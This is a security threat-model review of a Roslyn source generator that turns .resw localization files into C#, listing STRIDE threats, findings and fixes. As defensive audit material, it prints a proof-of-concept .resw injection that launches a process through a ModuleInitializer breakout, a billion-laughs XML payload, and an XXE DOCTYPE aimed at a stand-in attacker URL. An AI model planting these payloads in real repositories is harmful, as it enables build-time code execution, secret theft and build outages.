# Chunk 08 — Source Generators & Analyzers — Threat Model

**Status:** Phase 2 — review complete
**Commit reviewed:** `4623474cac6e5f2b64df2501636fd5f8491a1bc3`
**Reviewer focus:** **EoP at build time.** A `.resw`-driven Roslyn `IIncrementalGenerator` emits C# that is then compiled into the user's assembly. Any unescaped interpolation of `.resw` data into emitted C# is a build-time RCE vector — a hostile localization PR (or a translator-supplied file) becomes RCE on every CI machine and developer IDE that opens the repo.

> **Headline finding:** the generator is currently vulnerable. `entry.Key` is interpolated unescaped into the emitted C# string-literal arguments at `LocSourceGenerator.cs:164`, allowing arbitrary C# code injection from a `.resw` `name` attribute. Severity **Critical**. Details in §6.

---

## 1. Scope

| File | Lines | Role |
|---|---:|---|
| `src/Reactor.Localization.Generator/LocSourceGenerator.cs` | 254 | `IIncrementalGenerator` — pipeline, code emission |
| `src/Reactor.Localization.Generator/ReswParser.cs` | 66 | `XmlDocument`-based `.resw` parser |
| `src/Reactor.Localization.Generator/Reactor.Localization.Generator.csproj` | 23 | `IsRoslynComponent=true`, `netstandard2.0`, references CodeAnalysis 4.8.0 |
| `src/Reactor.Analyzers/AccessibilityAnalyzers.cs` | 257 | REACTOR_A11Y_001/002/003 syntactic analyzers |
| `src/Reactor.Analyzers/HookRulesAnalyzer.cs` | 571 | REACTOR_HOOKS_001/004/005/006 |
| `src/Reactor.Analyzers/RequestedThemeSetAnalyzer.cs` | 87 | DUCT003 |
| `src/Reactor.Analyzers/RequestedThemeSetCodeFix.cs` | 76 | DUCT003 fix |
| `src/Reactor.Analyzers/UseLightweightStylingAnalyzer.cs` | 132 | DUCT002 |
| `src/Reactor.Analyzers/UseThemeRefAnalyzer.cs` | 96 | DUCT001 |
| `src/Reactor.Analyzers/UseThemeRefCodeFix.cs` | 63 | DUCT001 fix |
| `src/Reactor.Analyzers/Reactor.Analyzers.csproj` | 37 | `IsRoslynComponent=true`, packs to `analyzers/dotnet/cs` |
| **Total** | **1,662** | |

`AnalyzerReleases.Shipped.md` and `AnalyzerReleases.Unshipped.md` are part of the analyzer-release tracking convention and contain only diagnostic IDs/categories — no executable behavior.

---

## 2. Data-flow diagram

```
                            ┌───────────────────────────────────────────────┐
.resw files (semi-trusted)  │                                               │
+ project repo files        │             Build host (CI / dev IDE)         │
                            │                                               │
   AdditionalFiles  ──►  LocSourceGenerator.Initialize                       │
                              │                                              │
                              ▼                                              │
                          ReswParser.Parse  ── XmlDocument.LoadXml ──┐      │
                              │                                       │     │
                              ▼                                       │     │
                     filesByLocale[locale][file] = List<ReswEntry>    │     │
                              │                                       │     │
                              ▼                                       │     │
                     EmitLocClass / EmitKeyField                      │     │
                          (StringBuilder of C# source)                │     │
                              │                                       │     │
                              ▼                                       │     │
                     SourceProductionContext.AddSource("Loc.g.cs")    │     │
                              │                                       │     │
                              ▼                                       │     │
                     ◄─── compiled into the user's assembly ──►       │     │
                                                                       │     │
   .cs syntax trees ──► HookRulesAnalyzer / Accessibility… ───────────┘     │
                              │                                              │
                              ▼                                              │
                     SyntaxNodeAnalysisContext.ReportDiagnostic              │
                              │                                              │
                              ▼                                              │
                     IDE / build log diagnostic text                          │
                            └───────────────────────────────────────────────┘
```

Key observation: `Loc.g.cs` is **compiled into the user's assembly**. Any string the generator writes into that file becomes IL on that machine and runs at the privilege of whatever invokes the build.

---

## 3. Trust boundaries crossed

| Boundary | Direction | Assumption made today |
|---|---|---|
| Repo content (.resw) → source generator | inbound | "repo is what the developer authored" — but PR review on a multi-contributor repo is the actual trust gate. If a hostile PR sneaks past review, the .resw bytes execute at build time on every reviewer/CI box that builds the branch. |
| Source generator → C# compiler | outbound (build-time code emission) | Compiler trusts whatever the generator emits. The generator is therefore in the *Trusted Computing Base for the build*. |
| Repo content (.cs) → analyzer | inbound | Analyzers only read; they emit diagnostics, not code. Trust impact is bounded to "the IDE displays a misleading message" unless the analyzer itself crashes or hangs. |
| Build property (`build_property.ReactorLocDefaultLocale`, …) → generator | inbound | These come from `.editorconfig` / MSBuild props in the repo — also semi-trusted. They flow into a dictionary key only, not into emitted source. |

The single new boundary the generator opens is **"`.resw` author → build-time code execution"**. Treating `.resw` as semi-trusted (per `000-…`) means this boundary must be hard.

---

## 4. Asset inventory

| Asset | Why an attacker wants it |
|---|---|
| **Code execution on the build host** (CI, dev laptop, reviewer's machine) | Highest. CI tokens, signing keys, VPN creds, source-disk read, lateral movement. The IDE runs analyzers/generators in-process — so this is also EoP into the developer's user session. |
| Integrity of the produced binary | Generator runs after PR merge — injecting a backdoor into `Loc.g.cs` produces a tainted shipping artifact. |
| Build-time availability (DoS) | A `.resw` file that hangs the generator stops every build. Only a nuisance, but visible. |
| Diagnostic message integrity | An attacker who can inject `{0}`-style format markers or terminal control sequences into a diagnostic message can spoof IDE output. Low. |

---

## 5. STRIDE table

| # | Category | Threat | Attacker model | Impact | Likelihood | Current mitigation | Finding |
|---:|---|---|---|---|---|---|---|
| 1 | **Elevation of Privilege** | Hostile `.resw` `name` attribute interpolated unescaped into C# string-literal in `Loc.g.cs` → arbitrary code at build time. | Hostile PR / hostile fork / repo-cloning developer | **Critical**: build-time RCE | **Realised** today | None | **F-1** |
| 2 | **Elevation of Privilege** | `.resw` file name (drives `ns`) interpolated unescaped into C# string-literal — same class of attack as F-1 but via the file name on disk. | Hostile PR adding a file named e.g. `Foo");evil();var _=("` (extension `.resw` so it's picked up). On Windows, `"` is forbidden in file names — but `"`-equivalent unicode lookalikes pass `char.IsLetterOrDigit` if smuggled through some VCS or non-Windows checkout. | **Critical** if reachable | **Low** on Windows (filesystem rejects `"`); higher on case-insensitive cross-platform CI (Linux container will accept any byte) | None — `ns` flows raw into the literal | **F-2** |
| 3 | **EoP** | Sanitised identifier collides with a C# reserved keyword (`class`, `namespace`, `void`, `event`, `default`, …) — emits invalid C#. Build-break only, not RCE. | Hostile or careless `.resw` author | DoS on build | High | None — `SanitizeIdentifier` only filters chars, not keywords | **F-3** (Medium) |
| 4 | **EoP / DoS** | Two distinct keys sanitize to the same identifier (`Foo-Bar` and `Foo_Bar` both → `Foo_Bar`) → duplicate-member compile error. | Hostile PR adding a colliding key | Build-break | Medium | None | **F-4** (Medium) |
| 5 | **Tampering of XML doc / format-string injection** | Hostile `.resw` value contains `{0}` which is later interpreted by `string.Format` somewhere downstream, or terminal escape sequences in a diagnostic. | Hostile `.resw` author | Misleading IDE / log output | Low | XML-doc emit replaces `&`/`<`/`>` and strips newlines (`LocSourceGenerator.cs:158-162`); diagnostic args are passed positionally, so a `{0}` in `entry.Key` is rendered, not re-formatted. | **F-5** (Low — informational) |
| 6 | **Denial of Service** | Pathological XML in `.resw` — DTD entity expansion (billion laughs), deeply nested elements, multi-megabyte single attribute. `XmlDocument.LoadXml` loads the whole document and resolves entities by default. | Hostile `.resw` author | Generator hang / OOM, breaks every build | Medium | `XmlResolver` is `null` by default in modern .NET, blocking external DTDs (XXE), but **internal DTD entity expansion is still on** because `XmlDocument` doesn't disable `DtdProcessing` and there's no `XmlReaderSettings` configured. `LoadXml` is also not size-bounded. | **F-6** (High — DoS, not RCE) |
| 7 | **DoS** | Generator runs on every keystroke in IDE; pathological number of keys (1M entries in one file) → quadratic emit cost (`StringBuilder.AppendLine` calls + `OrderBy` allocation). | Hostile PR | Slow IDE / OOM | Low — quadratic in keys but linear in input size | None — no per-file cap, no per-locale cap | **F-7** (Low) |
| 8 | **Info disclosure / Repudiation** | XXE — generator dereferences an external entity to leak repo contents to attacker URL. | Hostile `.resw` with `<!DOCTYPE ... SYSTEM "http://attacker/x">` | Build-host file leak | Low (default `XmlResolver=null` blocks this since .NET 4.5.2 / netstandard2.0) | Default | **F-8** (verify; not a finding pending verification) |
| 9 | **Tampering / EoP via diagnostics** | Analyzer crashes the host on a syntactically valid but semantically odd input (null deref, unbounded recursion in `IsOrDerivesFrom`, etc.). | Crafted `.cs` syntax tree | Build-break / IDE crash | Medium | `IsOrDerivesFrom` has a `while (type is not null)` that walks `BaseType`. A circular base chain would loop — Roslyn does not produce one, but a malformed metadata reference might. Low realistic exposure. | **F-9** (Low — defensive) |
| 10 | **Spoofing** of analyzer-emitted strings | `RequestedThemeSetAnalyzer.cs:80` calls `assignment.Right.ToString()` and inserts it into a diagnostic message format. A crafted RHS could embed `{0}`-style placeholders. | Hostile `.cs` source under review | Misleading IDE display | Low | Diagnostic args are passed as a separate object[]; the format string itself comes from `MessageFormat` — an attacker controls only an *arg*, not the format. The runtime format expansion does not recurse. | **No finding.** |

---

## 6. Findings

### F-1 — **CRITICAL** — Hostile `.resw` `name` attribute is direct build-time C# code injection

**File:** `src/Reactor.Localization.Generator/LocSourceGenerator.cs:164`

```csharp
sb.AppendLine($"{indent}public static readonly MessageKey {SanitizeIdentifier(entry.Key)} = new(\"{ns}\", \"{entry.Key}\");");
```

`entry.Key` is `node.Attributes?["name"]?.Value` from the `.resw` XML (`ReswParser.cs:42`). It is interpolated **unescaped** twice on this line:
- Inside the identifier slot — sanitised by `SanitizeIdentifier` (line 241), which is correct for the identifier position.
- Inside the second C# string literal (the `\"{entry.Key}\"` argument to the `MessageKey` constructor) — **NOT escaped**.

**Exploit.** A `.resw` entry of the form

```xml
<data name='Foo&quot;); System.Diagnostics.Process.Start(&quot;calc.exe&quot;); var _ = new MessageKey(&quot;a&quot;, &quot;b'>
  <value>x</value>
</data>
```

(where `&quot;` is a literal `"`, perfectly legal in an XML attribute value) is parsed by `XmlDocument` into `entry.Key = "Foo\"); System.Diagnostics.Process.Start(\"calc.exe\"); var _ = new MessageKey(\"a\", \"b"`. Sanitised the identifier becomes `Foo___System_Diagnostics…`. The emitted line becomes:

```csharp
public static readonly MessageKey Foo_______System_Diagnostics_Process_Start__calc_exe_____var____new_MessageKey__a____b = new("Resources", "Foo"); System.Diagnostics.Process.Start("calc.exe"); var _ = new MessageKey("a", "b");
```

That compiles. The static-field initialiser in the user's assembly now contains an arbitrary statement executed when the generated `Loc` class is class-init'd, and an additional top-level statement runs at the file/class scope (the second `var _ = new MessageKey(…)` is part of the next "field" — a syntactically clever payload would close the class declaration, declare a `ModuleInitializer`-attributed method, and reopen). For a more robust payload, the attacker can break out of the class definition entirely:

```
"); } } static class Pwn { [System.Runtime.CompilerServices.ModuleInitializer] internal static void M() { System.Diagnostics.Process.Start("calc.exe"); } } namespace Microsoft.UI.Reactor.Localization { internal static class Loc2 { public static readonly MessageKey X = new("a", "b
```

`[ModuleInitializer]` runs **on assembly load** — including during the build itself if a downstream tool loads the just-built assembly, and certainly when the app under construction first runs.

The same field, `entry.Key`, also flows into the first `\"{ns}\"` arg's neighbouring slot and into the XML doc summary (which uses the `value`, not the key, but the same risk class for the value would apply — see below).

**The XML doc summary is escaped:**

```csharp
var escapedValue = entry.Value
    .Replace("\r\n", " ")
    .Replace("\n", " ")
    .Replace("&", "&amp;")
    .Replace("<", "&lt;")
    .Replace(">", "&gt;");
sb.AppendLine($"{indent}/// <summary>{escapedValue}</summary>");
```

This is correct *for an XML doc comment* (single-line `///`, no `*/` close-comment risk because it's not a `/*…*/` block). The bug is **not** here; the bug is that the same care was not applied to the executable-string-literal slot on the next line.

**Recommendation.** Apply C# string-literal escaping to every `.resw`-derived string before interpolating it into a `"…"` literal. The minimum needed: `\` → `\\`, `"` → `\"`, `\r` → `\r`, `\n` → `\n`, `\t` → `\t`, plus rejection of any character below `0x20` other than those, and any surrogate-pair issue. The simplest correct fix is to use Roslyn's own escaper — `SymbolDisplay.FormatLiteral(entry.Key, quote: true)` — which produces `"..."` with all C# escapes applied:

```csharp
sb.AppendLine($"{indent}public static readonly MessageKey {SanitizeIdentifier(entry.Key)} = new({SymbolDisplay.FormatLiteral(ns, true)}, {SymbolDisplay.FormatLiteral(entry.Key, true)});");
```

This is the same primitive Roslyn uses internally to emit string literals; it is the canonical answer to "I have an arbitrary string and need to put it in C# source." A targeted unit test should pin the behaviour: fuzz a `.resw` `name` attribute containing each of `"`, `\`, `\r`, `\n`, ` `, surrogate halves, and a triple-`"` raw-string close, and verify the emitted source compiles without changing semantics.

**Severity:** Critical. **I would not ship this.**

---

### F-2 — **CRITICAL (conditional)** — File-name-derived namespace is also unescaped

**File:** `src/Reactor.Localization.Generator/LocSourceGenerator.cs:164` (the `\"{ns}\"` slot) and `LocSourceGenerator.cs:140` (`internal static class {SanitizeIdentifier(ns)}`).

`ns` comes from `defaultFiles.Keys`, which originates in `ParseFilePath` returning `Path.GetFileNameWithoutExtension(parts[parts.Length - 1])` — the file name stem. On Windows, `"` is a forbidden filename character, so this is harder to weaponise locally. But:

- A Linux CI machine cloning a repo whose tree was crafted on a non-Windows source (e.g. a `.tar` extracted by hand) **will** accept `Foo".resw` as a filename — `git` happily stores that path in the index.
- Once the file is on disk on Linux CI, `Path.GetFileNameWithoutExtension("Foo\".resw")` returns `Foo"` and that flows into the same unescaped string-literal slot on line 164.

The class-name slot on line 140 *is* sanitised by `SanitizeIdentifier`, so the class declaration is safe. The string-literal slot on 164 is **not** sanitised at all.

**Recommendation.** Same fix as F-1 — escape `ns` with `SymbolDisplay.FormatLiteral` before emitting. As a defence-in-depth, also reject any `.resw` whose file-name stem contains characters outside `[A-Za-z0-9_.-]` and emit a `Diagnostic` instead.

**Severity:** Critical conditional on hostile filenames being achievable; the fix is the same one F-1 forces, so this is automatically resolved by F-1's fix.

---

### F-3 — **MEDIUM** — `SanitizeIdentifier` does not check for C# reserved keywords

**File:** `src/Reactor.Localization.Generator/LocSourceGenerator.cs:241-253`

```csharp
private static string SanitizeIdentifier(string name)
{
    var sb = new StringBuilder(name.Length);
    for (int i = 0; i < name.Length; i++)
    {
        var c = name[i];
        if (i == 0 && char.IsDigit(c))
            sb.Append('_');
        sb.Append(char.IsLetterOrDigit(c) || c == '_' ? c : '_');
    }
    return sb.ToString();
}
```

A `.resw` key of `class`, `namespace`, `void`, `event`, `default`, `goto`, … survives sanitisation unchanged and produces invalid C# — every build of the repo fails. This is a DoS, not RCE, but a translator who enters `Class` (legal display string) is one capitalisation away from a build-break.

The same routine doesn't check for **contextual** keywords (`record`, `where`, `yield`) — those are allowed as identifiers, so they're a non-issue in C#. The hard reserved set is what matters.

**Recommendation.** Either prefix with `@` unconditionally (always emits `@Foo`, accepting the cosmetic cost), or check against the 78-element reserved-word list and prefix `_` on collision. Roslyn exposes `SyntaxFacts.GetKeywordKind(name)` — if non-`None`, prepend `@` (the C# escape that turns any keyword into a usable identifier).

**Severity:** Medium (build availability).

---

### F-4 — **MEDIUM** — Sanitised identifiers can collide

**File:** `src/Reactor.Localization.Generator/LocSourceGenerator.cs:241-253` and `:154-165`

`Foo Bar`, `Foo-Bar`, `Foo.Bar`, `Foo/Bar` all sanitise to `Foo_Bar`. A `.resw` containing two such keys produces two `public static readonly MessageKey Foo_Bar = …` in the same class — a CS0102 duplicate-member error. The generator does not deduplicate or report a Roslyn diagnostic; the user sees a confusing compile error against generated code.

**Recommendation.** Detect collisions in `EmitLocClass` and either (a) emit a Roslyn `Diagnostic` and skip the second member, or (b) suffix `_2`, `_3`, … to disambiguate. Either is acceptable; option (a) is preferred because silent renaming hides translator mistakes.

**Severity:** Medium.

---

### F-5 — **LOW** — `.resw` value is rendered into XML doc with `<>&` escaping but no `--` / `]]>` handling

**File:** `src/Reactor.Localization.Generator/LocSourceGenerator.cs:157-163`

The escape covers `<`, `>`, `&`, `\r\n`, `\n`. It does not strip `\r` alone, does not handle the `--` (which is illegal inside an XML comment, but `///` is line-prefixed so this isn't reachable), and does not handle Unicode bidi/control characters that could rearrange visible IntelliSense text. Since the doc comment is never executed and is not part of an XML comment block (`<!--…-->`), there is no code-injection path — only a cosmetic / homograph concern in IntelliSense. Worth tracking but not a security finding.

**Severity:** Low / informational.

---

### F-6 — **HIGH (DoS, not RCE)** — `XmlDocument.LoadXml` does not disable DTD processing

**File:** `src/Reactor.Localization.Generator/ReswParser.cs:34-35`

```csharp
var doc = new XmlDocument();
doc.LoadXml(xmlContent);
```

In modern .NET, `XmlDocument.XmlResolver` defaults to `null`, which blocks **external** entity resolution (XXE → file/URL leaks are mitigated). However, **internal entity expansion is still active** unless `DtdProcessing` is set to `Prohibit`/`Ignore`. A classic billion-laughs payload:

```xml
<!DOCTYPE root [
  <!ENTITY a "AAAAAAAA…">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">
  …
  <!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;">
]>
<root><data name="x"><value>&i;</value></data></root>
```

expands to gigabytes of memory in `XmlDocument`, OOM'ing the generator host (IDE or `dotnet build`). The generator runs **in-process** in Visual Studio / Rider / VS Code's OmniSharp / `dotnet build`, so this OOMs the editor.

**Recommendation.** Switch to `XmlReader` with hardened settings:

```csharp
var settings = new XmlReaderSettings
{
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null,
    MaxCharactersFromEntities = 0,
    MaxCharactersInDocument = 10_000_000, // ~10 MB cap
};
using var reader = XmlReader.Create(new StringReader(xmlContent), settings);
var doc = new XmlDocument();
doc.Load(reader);
```

Also bound the input size before calling `GetText().ToString()` (line 72) — a multi-GB `.resw` is parsed in memory before it can be rejected.

**Severity:** High (build-host availability + IDE crash).

---

### F-7 — **LOW** — No per-file or per-locale cap; emit is O(N) but sort + emit is allocation-heavy

**File:** `src/Reactor.Localization.Generator/LocSourceGenerator.cs:97-101`, `:135-148`

`OrderBy(...).ToList()` and per-key `AppendLine` interpolations are linear but allocate per-entry. With 100 K keys × 30 locales the generator becomes the bottleneck for incremental compilation. Not a security issue per se; bound it for robustness.

**Severity:** Low.

---

### F-8 — **VERIFY** — XXE relies on .NET default

**File:** `src/Reactor.Localization.Generator/ReswParser.cs:34-35`

`XmlResolver = null` is the default on `XmlDocument` since .NET 4.5.2 and on netstandard2.0 implementations. This **should** mean external DTD references are not fetched. However, the project targets `netstandard2.0` (`Reactor.Localization.Generator.csproj:4`), and the actual default depends on the *consumer* runtime — on .NET Framework 4.5 hosts that load this analyzer, the default flips to `XmlUrlResolver`. Roslyn ships analyzers into VS host processes; older VS builds may run on .NET Framework 4.7.2.

**Recommendation.** Set `doc.XmlResolver = null;` explicitly. Belt-and-braces.

**Severity:** Low (verification + defence-in-depth) until verified across all supported host runtimes.

---

### F-9 — **LOW** — `IsOrDerivesFrom` walks `BaseType` without a depth cap

**File:** `src/Reactor.Analyzers/HookRulesAnalyzer.cs:250-262`

`while (type is not null) { … type = type.BaseType; }`. Roslyn does not produce circular base chains for source types, but malformed metadata could in principle present an infinite chain. Defensive only.

**Severity:** Low.

---

### Other paths checked and clean

- `EmitMissingKeyDiagnostics` (`LocSourceGenerator.cs:167-221`) — passes `entry.Key` and friends as `Diagnostic.Create` *args*, not as part of the format string. The format string is the literal `"Key '{0}.{1}' is present in {2} but missing in locale '{3}'"` (line 181). Diagnostic-arg expansion is a single `string.Format`, so embedded `{0}` in a key name is rendered as a literal placeholder in the user's IDE, **not** re-expanded. Safe.
- All five analyzers (`HookRulesAnalyzer`, `AccessibilityAnalyzers` × 3, `RequestedThemeSetAnalyzer`, `UseLightweightStylingAnalyzer`, `UseThemeRefAnalyzer`) only **read** `SyntaxNodeAnalysisContext`. None emit C# source. None call `AddSource`. Their output channel is `ReportDiagnostic`. This restricts their attack surface to "make the IDE display a wrong message" or "crash"/"hang the analyzer host."
- `RequestedThemeSetAnalyzer.cs:80` — `assignment.Right.ToString()` flows into a `Diagnostic` as an *arg*, not into a format string. Safe (see STRIDE row 10).
- `UseThemeRefAnalyzer.cs:83` — `literal.Token.ValueText` flows into a `Diagnostic` as an *arg*. Safe.
- All four code-fix providers build syntax via `SyntaxFactory.…` from values that came from the user's existing tree. They do not splice attacker text into raw source — they rebuild the syntax. Safe.
- `Reactor.Localization.Generator.csproj:14-16` — `<InternalsVisibleTo Include="Reactor.Tests" />`. Cosmetic; no security impact at build time.

---

## 7. Open questions

1. **Is the `.editorconfig` build-property surface trusted?** `build_property.ReactorLocDefaultLocale` and `build_property.ReactorLocMissingKeySeverity` flow into the generator (`LocSourceGenerator.cs:31, 39`). They are used as a dictionary key and a severity flag, never interpolated into source, so even with hostile values they cannot inject code today. But if a future change uses a build property in emit, that path inherits the same trust assumption as `.resw` (semi-trusted).
2. **What is the `.resw` review policy on the repo?** If `.resw` files can be added/edited by external contributors without a signed-off review, the F-1 fix becomes urgent regardless of the fix shipping in Reactor itself, because the repo's own translation pipeline is the threat path.
3. **Does the analyzer host process load `Reactor.Localization.Generator.dll` on .NET Framework hosts?** F-8 hinges on this.
4. **Is `SourceProductionContext.AddSource` the only emit path?** Confirmed by inspection (single call at `LocSourceGenerator.cs:98`). No `RegisterImplementationSourceOutput` or `RegisterPostInitializationOutput` to also worry about.
5. **Should the generator emit a `Diagnostic` and abort instead of producing broken `Loc.g.cs` when a key collides or is a reserved keyword?** Today it emits anyway and the C# compiler reports an opaque error against generated code.

---

## 8. Out-of-scope referrals

- **`.resw` reading at runtime** (`Microsoft.UI.Reactor.Localization.ReswResourceProvider`) → Chunk 11. Different threat model: runtime ICU formatting and message-key resolution, not code emission.
- **`ReswReader` / `ReswWriter` in the CLI** (`src/Reactor.Cli/Loc/ReswReader.cs`, `ReswWriter.cs`) → Chunk 06. The CLI's XML hardening and the generator's XML hardening should converge; F-6 should be cross-checked with whatever Chunk 06 lands.
- **`SourceRewriter` / `LocalizableStringScanner`** (CLI) → Chunk 06. Same threat class (build-time-ish interpolation of repo-derived strings) but a different tool.
- **`TranslateCommand` Azure OpenAI ingestion** → Chunk 07. The `.resw` an attacker would write a billion-laughs into could itself be the *output* of a hostile translation provider; the generator must not be the last line of defence, but in practice it is.
- **VS Code extension's regex-based component detector** → Chunk 04. Unrelated to this generator.

---

## 9. Recommended fix order

1. **F-1 + F-2** — switch the two literal slots at `LocSourceGenerator.cs:164` to `SymbolDisplay.FormatLiteral`. One commit, ~5 lines, with a regression test that round-trips every printable ASCII character plus `"`, `\`, `\r`, `\n`, `\0`, surrogate halves, U+202E (RTL override), and a triple-quote sequence in `entry.Key` and `ns`. **Block on this.**
2. **F-6** — harden `ReswParser` to use a configured `XmlReader`. Same PR ideal.
3. **F-3 + F-4** — keyword-collision and identifier-collision handling. Surface as `Diagnostic`s, not silent rename.
4. **F-7, F-8, F-9** — defence-in-depth, separate PR.
